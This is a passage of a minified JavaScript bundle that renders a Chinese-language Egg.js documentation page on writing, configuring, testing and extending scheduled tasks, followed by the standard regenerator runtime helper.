\u662f\u8bf7\u6c42\u54cd\u5e94\u6a21\u578b\u7684\uff0c\u4f46\u662f\u4ecd\u7136\u8fd8\u4f1a\u6709\u8bb8\u591a\u573a\u666f\u9700\u8981\u6267\u884c\u4e00\u4e9b\u5b9a\u65f6\u4efb\u52a1\uff0c\u4f8b\u5982\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u5b9a\u65f6\u4e0a\u62a5\u5e94\u7528\u72b6\u6001\u3002"),r.a.createElement("li",null,"\u5b9a\u65f6\u4ece\u8fdc\u7a0b\u63a5\u53e3\u66f4\u65b0\u672c\u5730\u7f13\u5b58\u3002"),r.a.createElement("li",null,"\u5b9a\u65f6\u8fdb\u884c\u6587\u4ef6\u5207\u5272\u3001\u4e34\u65f6\u6587\u4ef6\u5220\u9664\u3002")),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u5957\u673a\u5236\u6765\u8ba9\u5b9a\u65f6\u4efb\u52a1\u7684\u7f16\u5199\u548c\u7ef4\u62a4\u66f4\u52a0\u4f18\u96c5\u3002"),r.a.createElement("h2",{id:"\u7f16\u5199\u5b9a\u65f6\u4efb\u52a1"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199\u5b9a\u65f6\u4efb\u52a1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199\u5b9a\u65f6\u4efb\u52a1"),r.a.createElement("p",null,"\u6240\u6709\u7684\u5b9a\u65f6\u4efb\u52a1\u90fd\u7edf\u4e00\u5b58\u653e\u5728 ",r.a.createElement("code",null,"app/schedule")," \u76ee\u5f55\u4e0b\uff0c\u6bcf\u4e00\u4e2a\u6587\u4ef6\u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u5b9a\u65f6\u4efb\u52a1\uff0c\u53ef\u4ee5\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1\u7684\u5c5e\u6027\u548c\u8981\u6267\u884c\u7684\u65b9\u6cd5\u3002"),r.a.createElement("p",null,"\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u66f4\u65b0\u8fdc\u7a0b\u6570\u636e\u5230\u5185\u5b58\u7f13\u5b58\u7684\u5b9a\u65f6\u4efb\u52a1\uff0c\u5c31\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"app/schedule")," \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a ",r.a.createElement("code",null,"update_cache.js")," \u6587\u4ef6"),r.a.createElement(o["a"],{code:"const Subscription = require('egg').Subscription;\n\nclass UpdateCache extends Subscription {\n  // \u901a\u8fc7 schedule \u5c5e\u6027\u6765\u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1\u7684\u6267\u884c\u95f4\u9694\u7b49\u914d\u7f6e\n  static get schedule() {\n    return {\n      interval: '1m', // 1 \u5206\u949f\u95f4\u9694\n      type: 'all', // \u6307\u5b9a\u6240\u6709\u7684 worker \u90fd\u9700\u8981\u6267\u884c\n    };\n  }\n\n  // subscribe \u662f\u771f\u6b63\u5b9a\u65f6\u4efb\u52a1\u6267\u884c\u65f6\u88ab\u8fd0\u884c\u7684\u51fd\u6570\n  async subscribe() {\n    const res = await this.ctx.curl('http://www.api.com/cache', {\n      dataType: 'json',\n    });\n    this.ctx.app.cache = res.data;\n  }\n}\n\nmodule.exports = UpdateCache;",lang:"js"}),r.a.createElement("p",null,"\u8fd8\u53ef\u4ee5\u7b80\u5199\u4e3a"),r.a.createElement(o["a"],{code:"module.exports = {\n  schedule: {\n    interval: '1m', // 1 \u5206\u949f\u95f4\u9694\n    type: 'all', // \u6307\u5b9a\u6240\u6709\u7684 worker \u90fd\u9700\u8981\u6267\u884c\n  },\n  async task(ctx) {\n    const res = await ctx.curl('http://www.api.com/cache', {\n      dataType: 'json',\n    });\n    ctx.app.cache = res.data;\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\u4f1a\u5728\u6bcf\u4e00\u4e2a Worker \u8fdb\u7a0b\u4e0a\u6bcf 1 \u5206\u949f\u6267\u884c\u4e00\u6b21\uff0c\u5c06\u8fdc\u7a0b\u6570\u636e\u8bf7\u6c42\u56de\u6765\u6302\u8f7d\u5230 ",r.a.createElement("code",null,"app.cache")," \u4e0a\u3002"),r.a.createElement("h3",{id:"\u4efb\u52a1"},r.a.createElement(l["AnchorLink"],{to:"#\u4efb\u52a1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4efb\u52a1"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"task")," \u6216 ",r.a.createElement("code",null,"subscribe")," \u540c\u65f6\u652f\u6301 ",r.a.createElement("code",null,"generator function")," \u548c ",r.a.createElement("code",null,"async function"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"task")," \u7684\u5165\u53c2\u4e3a ",r.a.createElement("code",null,"ctx"),"\uff0c\u533f\u540d\u7684 Context \u5b9e\u4f8b\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b83\u8c03\u7528 ",r.a.createElement("code",null,"service")," \u7b49\u3002")),r.a.createElement("h3",{id:"\u5b9a\u65f6\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u5b9a\u65f6\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b9a\u65f6\u65b9\u5f0f"),r.a.createElement("p",null,"\u5b9a\u65f6\u4efb\u52a1\u53ef\u4ee5\u6307\u5b9a interval \u6216\u8005 cron \u4e24\u79cd\u4e0d\u540c\u7684\u5b9a\u65f6\u65b9\u5f0f\u3002"),r.a.createElement("h4",{id:"interval"},r.a.createElement(l["AnchorLink"],{to:"#interval","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"interval"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"schedule.interval")," \u53c2\u6570\u6765\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1\u7684\u6267\u884c\u65f6\u673a\uff0c\u5b9a\u65f6\u4efb\u52a1\u5c06\u4f1a\u6bcf\u95f4\u9694\u6307\u5b9a\u7684\u65f6\u95f4\u6267\u884c\u4e00\u6b21\u3002interval \u53ef\u4ee5\u914d\u7f6e\u6210"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6570\u5b57\u7c7b\u578b\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u6570\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"5000"),"\u3002"),r.a.createElement("li",null,"\u5b57\u7b26\u7c7b\u578b\uff0c\u4f1a\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/zeit/ms"},"ms")," \u8f6c\u6362\u6210\u6beb\u79d2\u6570\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"5s"),"\u3002")),r.a.createElement(o["a"],{code:"module.exports = {\n  schedule: {\n    // \u6bcf 10 \u79d2\u6267\u884c\u4e00\u6b21\n    interval: '10s',\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"cron"},r.a.createElement(l["AnchorLink"],{to:"#cron","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"cron"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"schedule.cron")," \u53c2\u6570\u6765\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1\u7684\u6267\u884c\u65f6\u673a\uff0c\u5b9a\u65f6\u4efb\u52a1\u5c06\u4f1a\u6309\u7167 cron \u8868\u8fbe\u5f0f\u5728\u7279\u5b9a\u7684\u65f6\u95f4\u70b9\u6267\u884c\u3002cron \u8868\u8fbe\u5f0f\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/harrisiirak/cron-parser"},"cron-parser")," \u8fdb\u884c\u89e3\u6790\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1acron-parser \u652f\u6301\u53ef\u9009\u7684\u79d2\uff08linux crontab \u4e0d\u652f\u6301\uff09\u3002")),r.a.createElement(o["a"],{code:"*    *    *    *    *    *\n\u252c    \u252c    \u252c    \u252c    \u252c    \u252c\n\u2502    \u2502    \u2502    \u2502    \u2502    |\n\u2502    \u2502    \u2502    \u2502    \u2502    \u2514 day of week (0 - 7) (0 or 7 is Sun)\n\u2502    \u2502    \u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500 month (1 - 12)\n\u2502    \u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 day of month (1 - 31)\n\u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 hour (0 - 23)\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 minute (0 - 59)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 second (0 - 59, optional)",lang:"bash"}),r.a.createElement(o["a"],{code:"module.exports = {\n  schedule: {\n    // \u6bcf\u4e09\u5c0f\u65f6\u51c6\u70b9\u6267\u884c\u4e00\u6b21\n    cron: '0 0 */3 * * *',\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"\u7c7b\u578b"},r.a.createElement(l["AnchorLink"],{to:"#\u7c7b\u578b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7c7b\u578b"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u7684\u5b9a\u65f6\u4efb\u52a1\u9ed8\u8ba4\u652f\u6301\u4e24\u79cd\u7c7b\u578b\uff0cworker \u548c all\u3002worker \u548c all \u90fd\u652f\u6301\u4e0a\u9762\u7684\u4e24\u79cd\u5b9a\u65f6\u65b9\u5f0f\uff0c\u53ea\u662f\u5f53\u5230\u6267\u884c\u65f6\u673a\u65f6\uff0c\u4f1a\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\u7684 worker \u4e0d\u540c\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"worker")," \u7c7b\u578b\uff1a\u6bcf\u53f0\u673a\u5668\u4e0a\u53ea\u6709\u4e00\u4e2a worker \u4f1a\u6267\u884c\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\uff0c\u6bcf\u6b21\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\u7684 worker \u7684\u9009\u62e9\u662f\u968f\u673a\u7684\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"all")," \u7c7b\u578b\uff1a\u6bcf\u53f0\u673a\u5668\u4e0a\u7684\u6bcf\u4e2a worker \u90fd\u4f1a\u6267\u884c\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\u3002")),r.a.createElement("h3",{id:"\u5176\u4ed6\u53c2\u6570"},r.a.createElement(l["AnchorLink"],{to:"#\u5176\u4ed6\u53c2\u6570","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5176\u4ed6\u53c2\u6570"),r.a.createElement("p",null,"\u9664\u4e86\u521a\u624d\u4ecb\u7ecd\u5230\u7684\u51e0\u4e2a\u53c2\u6570\u4e4b\u5916\uff0c\u5b9a\u65f6\u4efb\u52a1\u8fd8\u652f\u6301\u8fd9\u4e9b\u53c2\u6570\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"cronOptions"),": \u914d\u7f6e cron \u7684\u65f6\u533a\u7b49\uff0c\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/harrisiirak/cron-parser#options"},"cron-parser")," \u6587\u6863"),r.a.createElement("li",null,r.a.createElement("code",null,"immediate"),"\uff1a\u914d\u7f6e\u4e86\u8be5\u53c2\u6570\u4e3a true \u65f6\uff0c\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\u4f1a\u5728\u5e94\u7528\u542f\u52a8\u5e76 ready \u540e\u7acb\u523b\u6267\u884c\u4e00\u6b21\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"disable"),"\uff1a\u914d\u7f6e\u8be5\u53c2\u6570\u4e3a true \u65f6\uff0c\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\u4e0d\u4f1a\u88ab\u542f\u52a8\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"env"),"\uff1a\u6570\u7ec4\uff0c\u4ec5\u5728\u6307\u5b9a\u7684\u73af\u5883\u4e0b\u624d\u542f\u52a8\u8be5\u5b9a\u65f6\u4efb\u52a1\u3002")),r.a.createElement("h3",{id:"\u6267\u884c\u65e5\u5fd7"},r.a.createElement(l["AnchorLink"],{to:"#\u6267\u884c\u65e5\u5fd7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6267\u884c\u65e5\u5fd7"),r.a.createElement("p",null,"\u6267\u884c\u65e5\u5fd7\u4f1a\u8f93\u51fa\u5230 ",r.a.createElement("code",null,"$","{","appInfo.root","}","/logs/","{","app_name","}","/egg-schedule.log"),"\uff0c\u9ed8\u8ba4\u4e0d\u4f1a\u8f93\u51fa\u5230\u63a7\u5236\u53f0\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"config.customLogger.scheduleLogger")," \u6765\u81ea\u5b9a\u4e49\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nconfig.customLogger = {\n  scheduleLogger: {\n    // consoleLevel: 'NONE',\n    // file: path.join(appInfo.root, 'logs', appInfo.name, 'egg-schedule.log'),\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"\u52a8\u6001\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1"},r.a.createElement(l["AnchorLink"],{to:"#\u52a8\u6001\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u52a8\u6001\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1"),r.a.createElement("p",null,"\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u914d\u7f6e\u5b9a\u65f6\u4efb\u52a1\u7684\u53c2\u6570\u3002\u5b9a\u65f6\u4efb\u52a1\u8fd8\u6709\u652f\u6301\u53e6\u4e00\u79cd\u5199\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  return {\n    schedule: {\n      interval: app.config.cacheTick,\n      type: 'all',\n    },\n    async task(ctx) {\n      const res = await ctx.curl('http://www.api.com/cache', {\n        contentType: 'json',\n      });\n      ctx.app.cache = res.data;\n    },\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"\u624b\u52a8\u6267\u884c\u5b9a\u65f6\u4efb\u52a1"},r.a.createElement(l["AnchorLink"],{to:"#\u624b\u52a8\u6267\u884c\u5b9a\u65f6\u4efb\u52a1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u624b\u52a8\u6267\u884c\u5b9a\u65f6\u4efb\u52a1"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.runSchedule(schedulePath)")," \u6765\u8fd0\u884c\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u3002",r.a.createElement("code",null,"app.runSchedule")," \u63a5\u53d7\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6\u8def\u5f84\uff08",r.a.createElement("code",null,"app/schedule")," \u76ee\u5f55\u4e0b\u7684\u76f8\u5bf9\u8def\u5f84\u6216\u8005\u5b8c\u6574\u7684\u7edd\u5bf9\u8def\u5f84\uff09\uff0c\u6267\u884c\u5bf9\u5e94\u7684\u5b9a\u65f6\u4efb\u52a1\uff0c\u8fd4\u56de\u4e00\u4e2a Promise\u3002"),r.a.createElement("p",null,"\u6709\u4e00\u4e9b\u573a\u666f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u624b\u52a8\u7684\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\uff0c\u4f8b\u5982"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u901a\u8fc7\u624b\u52a8\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\u53ef\u4ee5\u66f4\u4f18\u96c5\u7684\u7f16\u5199\u5bf9\u5b9a\u65f6\u4efb\u52a1\u7684\u5355\u5143\u6d4b\u8bd5\u3002")),r.a.createElement(o["a"],{code:"const mm = require('egg-mock');\nconst assert = require('assert');\n\nit('should schedule work fine', async () => {\n  const app = mm.app();\n  await app.ready();\n  await app.runSchedule('update_cache');\n  assert(app.cache);\n});",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5e94\u7528\u542f\u52a8\u65f6\uff0c\u624b\u52a8\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\u8fdb\u884c\u7cfb\u7edf\u521d\u59cb\u5316\uff0c\u7b49\u521d\u59cb\u5316\u5b8c\u6bd5\u540e\u518d\u542f\u52a8\u5e94\u7528\u3002\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./app-start"},"\u5e94\u7528\u542f\u52a8\u81ea\u5b9a\u4e49"),"\u7ae0\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"app.js")," \u4e2d\u7f16\u5199\u521d\u59cb\u5316\u903b\u8f91\u3002")),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.beforeStart(async () => {\n    // \u4fdd\u8bc1\u5e94\u7528\u542f\u52a8\u76d1\u542c\u7aef\u53e3\u524d\u6570\u636e\u5df2\u7ecf\u51c6\u5907\u597d\u4e86\n    // \u540e\u7eed\u6570\u636e\u7684\u66f4\u65b0\u7531\u5b9a\u65f6\u4efb\u52a1\u81ea\u52a8\u89e6\u53d1\n    await app.runSchedule('update_cache');\n  });\n};",lang:"js"}),r.a.createElement("h2",{id:"\u6269\u5c55\u5b9a\u65f6\u4efb\u52a1\u7c7b\u578b"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u5b9a\u65f6\u4efb\u52a1\u7c7b\u578b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u5b9a\u65f6\u4efb\u52a1\u7c7b\u578b"),r.a.createElement("p",null,"\u9ed8\u8ba4\u6846\u67b6\u63d0\u4f9b\u7684\u5b9a\u65f6\u4efb\u52a1\u53ea\u652f\u6301\u6bcf\u53f0\u673a\u5668\u7684\u5355\u4e2a\u8fdb\u7a0b\u6267\u884c\u548c\u5168\u90e8\u8fdb\u7a0b\u6267\u884c\uff0c\u6709\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u7684\u670d\u52a1\u5e76\u4e0d\u662f\u5355\u673a\u90e8\u7f72\u7684\uff0c\u8fd9\u65f6\u5019\u53ef\u80fd\u6709\u4e00\u4e2a\u96c6\u7fa4\u7684\u67d0\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u7684\u9700\u6c42\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5e76\u6ca1\u6709\u76f4\u63a5\u63d0\u4f9b\u6b64\u529f\u80fd\uff0c\u4f46\u5f00\u53d1\u8005\u53ef\u4ee5\u5728\u4e0a\u5c42\u6846\u67b6\u81ea\u884c\u6269\u5c55\u65b0\u7684\u5b9a\u65f6\u4efb\u52a1\u7c7b\u578b\u3002"),r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"agent.js")," \u4e2d\u7ee7\u627f ",r.a.createElement("code",null,"agent.ScheduleStrategy"),"\uff0c\u7136\u540e\u901a\u8fc7 ",r.a.createElement("code",null,"agent.schedule.use()")," \u6ce8\u518c\u5373\u53ef\uff1a"),r.a.createElement(o["a"],{code:"module.exports = (agent) => {\n  class ClusterStrategy extends agent.ScheduleStrategy {\n    start() {\n      // \u8ba2\u9605\u5176\u4ed6\u7684\u5206\u5e03\u5f0f\u8c03\u5ea6\u670d\u52a1\u53d1\u9001\u7684\u6d88\u606f\uff0c\u6536\u5230\u6d88\u606f\u540e\u8ba9\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\n      // \u7528\u6237\u5728\u5b9a\u65f6\u4efb\u52a1\u7684 schedule \u914d\u7f6e\u4e2d\u6765\u914d\u7f6e\u5206\u5e03\u5f0f\u8c03\u5ea6\u7684\u573a\u666f\uff08scene\uff09\n      agent.mq.subscribe(this.schedule.scene, () => this.sendOne());\n    }\n  }\n  agent.schedule.use('cluster', ClusterStrategy);\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"ScheduleStrategy")," \u57fa\u7c7b\u63d0\u4f9b\u4e86\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.schedule")," - \u5b9a\u65f6\u4efb\u52a1\u7684\u5c5e\u6027\uff0c",r.a.createElement("code",null,"disable")," \u662f\u9ed8\u8ba4\u7edf\u4e00\u652f\u6301\u7684\uff0c\u5176\u4ed6\u914d\u7f6e\u53ef\u4ee5\u81ea\u884c\u89e3\u6790\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.sendOne(...args)")," - \u968f\u673a\u901a\u77e5\u4e00\u4e2a worker \u6267\u884c task\uff0c",r.a.createElement("code",null,"args")," \u4f1a\u4f20\u9012\u7ed9 ",r.a.createElement("code",null,"subscribe(...args)")," \u6216 ",r.a.createElement("code",null,"task(ctx, ...args)"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.sendAll(...args)")," - \u901a\u77e5\u6240\u6709\u7684 worker \u6267\u884c task\u3002"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},ojUw:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("nzxN");function r(){r=function(){return e};var e={},t=Object.prototype,n=t.hasOwnProperty,l=Object.defineProperty||function(e,t,n){e[t]=n.value},o="function"==typeof Symbol?Symbol:{},i=o.iterator||"@@iterator",c=o.asyncIterator||"@@asyncIterator",s=o.toStringTag||"@@toStringTag";function u(e,t,n){return Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}),e[t]}try{u({},"")}catch(N){u=function(e,t,n){return e[t]=n}}function d(e,t,n,a){var r=t&&t.prototype instanceof h?t:h,o=Object.create(r.prototype),i=new A(a||[]);return l(o,"_invoke",{value:x(e,n,i)}),o}function m(e,t,n){try{return{type:"normal",arg:e.call(t,n)}}catch(N){return{type:"throw",arg:N}}}e.wrap=d;var p={};function h(){}function g(){}function f(){}var E={};u(E,i,(function(){return this}));var b=Object.getPrototypeOf,v=b&&b(b(L([])));v&&v!==t&&n.call(v,i)&&(E=v);var y=f.prototype=h.prototype=Object.create(E);function k(e){["next","throw","return"].forEach((function(t){u(e,t,(function(e){return this._invoke(t,e)}))}))}function w(e,t){function r(l,o,i,c){var s=m(e[l],e,o);if("throw"!==s.type){var u=s.arg,d=u.value;return d&&"object"==Object(a["a"])(d)&&n.call(d,"__await")?t.resolve(d.__await).then((function(e){r("next",e,i,c)}),(function(e){r("throw",e,i,c)})):t.resolve(d).then((function(e){u.value=e,i(u)}),(function(e){return r("throw",e,i,c)}))}c(s.arg)}var o;l(this,"_invoke",{value:function(e,n){function a(){return new t((function(t,a){r(e,n,t,a)}))}return o=o?o.then(a,a):a()}})}function x(e,t,n){var a="suspendedStart";return function(r,l){if("executing"===a)throw new Error("Generator is already running");if("completed"===a){if("throw"===r)throw l;return T()}for(n.method=r,n.arg=l;;){var o=n.delegate;if(o){var i=j(o,n);if(i){if(i===p)continue;return i}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if("suspendedStart"===a)throw a="completed",n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);a="executing";var c=m(e,t,n);if("normal"===c.type){if(a=n.done?"completed":"suspendedYield",c.arg===p)continue;return{value:c.arg,done:n.done}}"throw"===c.type&&(a="completed",n.method="throw",n.arg=c.arg)}}}function j(e,t){var n=t.method,a=e.iterator[n];if(void 0===a)return t.delegate=null,"throw"===n&&e.iterator["return"]&&(t.method="return",t.arg=void 0,j(e,t),"throw"===t.method)||"return"!==n&&(t.method="throw",t.arg=new TypeError("The iterator does not provide a '"+n+"' method")),p;var r=m(a,e.iterator,t.arg);if("throw"===r.type)return t.method="throw",t.arg=r.arg,t.delegate=null,p;var l=r.arg;return l?l.done?(t[e.resultName]=l.value,t.next=e.nextLoc,"return"!==t.method&&(t.method="next",t.arg=void 0),t.delegate=null,p):l:(t.method="throw",t.arg=new TypeError("iterator result is not an object"),t.delegate=null,p)}function S(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function C(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function A(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(S,this),this.reset(!0)}function L(e){if(e){var t=e[i];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var a=-1,r=function t(){for(;++a<e.length;)if(n.call(e,a))return t.value=e[a],t.done=!1,t;return t.value=void 0,t.done=!0,t};return r.next=r}}return{next:T}}function T(){return{value:void 0,done:!0}}return g.prototype=f,l(y,"constructor",{value:f,configurable:!0}),l(f,"constructor",{value:g,configurable:!0}),g.displayName=u(f,s,"GeneratorFunction"),e.isGeneratorFunction=function(e){var t="function"==typeof e&&e.constructor;return!!t&&(t===g||"GeneratorFunction"===(t.displayName||t.name))},e.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,f):(e.__proto__=f,u(e,s,"GeneratorFunction")),e.prototype=Object.create(y),e},e.awrap=function(e){return{__await:e}},k(w.prototype),u(w.prototype,c,(function(){return this})),e.AsyncIterator=w,e.async=function(t,n,a,r,l){void 0===l&&(l=Promise);var o=new w(d(t,n,a,r),l);return e.isGeneratorFunction(n)?o:o.next().then((function(e){return e.done?e.value:o.next()}))},k(y),u(y,s,"Generator"),u(y,i,(function(){return this})),u(y,"toString",(function(){return"[object Generator]"})),e.keys=function(e){var t=Object(e),n=[];for(var a in t)n.push(a);return n.reverse(),function e(){for(;n.length;){var a=n.pop();if(a in t)return e.value=a,e.done=!1,e}return e.done=!0,e}},e.values=L,A.prototype={constructor:A,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(C),!e)for(var t in this)"t"===t.charAt(0)&&n.call(this,t)&&!isNaN(+t.slice(1))&&(this[t]=void 0)},stop:function(){this.done=!0;var e=this.tryEntries[0].completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var t=this;function a(n,a){return o.type="throw",o.arg=e,t.next=n,a&&(t.method="next",t.arg=void 0),!!a}for(var r=this.tryEntries.length-1;r>=0;--r){var l=this.tryEntries[r],o=l.completion;if("root"===l.tryLoc)return a("end");if(l.tryLoc<=this.prev){var i=n.call(l,"catchLoc"),c=n.call(l,"finallyLoc");if(i&&c){if(this.prev<l.catchLoc)return a(l.catchLoc,!0);if(this.prev<l.finallyLoc)return a(l.finallyLoc)}else if(i){if(this.prev<l.catchLoc)return a(l.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<l.finallyLoc)return a(l.finallyLoc)}}}},abrupt:function(e,t){for(var a=this.tryEntries.length-1;a>=0;--a){var r=this.tryEntries[a];if(r.tryLoc<=this.prev&&n.call(r,"finallyLoc")&&this.prev<r.finallyLoc){var l=r;break}}l&&("break"===e||"continue"===e)&&l.tryLoc<=t&&t<=l.finallyLoc&&(l=null);var o=l?l.completion:{};return o.type=e,o.arg=t,l?(this.method="next",this.next=l.finallyLoc,p):this.complete(o)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),p},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.finallyLoc===e)return this.complete(n.completion,n.afterLoc),C(n),p}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.tryLoc===e){var a=n.completion;if("throw"===a.type){var r=a.arg;C(n)}return r}}throw new Error("illegal catch attempt")},delegateYield:function(e,t,n){return this.delegate={iterator:L(e),resultName:t,nextLoc:n},"next"===this.method&&(this.arg=void 0),p}},e}},oonY:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.typescriptlang.org/"},"TypeScript")," is a typed 